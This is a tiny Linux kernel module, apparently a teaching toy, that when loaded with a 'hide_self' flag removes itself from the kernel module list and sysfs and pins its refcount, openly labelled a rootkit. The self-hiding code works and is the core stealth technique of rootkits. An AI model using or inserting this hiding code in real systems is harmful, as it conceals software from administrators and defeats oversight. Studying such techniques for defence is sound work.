/**
 * hello_rootkit -- Definitely Not A Rootkit
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nelson Elhage");
MODULE_DESCRIPTION("Definitely Not A Rootkit (It's totally a rootkit)");
MODULE_VERSION("0.1");

static bool hide_self;
module_param(hide_self, bool, 0444);

static int __init hello_rc_init(void){
	if (hide_self) {
		try_module_get(THIS_MODULE);
		kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->list);
		printk(KERN_INFO "I was never here.\n");
	}
	return 0;
}

static void __exit hello_rc_exit(void){
}


module_init(hello_rc_init);
module_exit(hello_rc_exit);
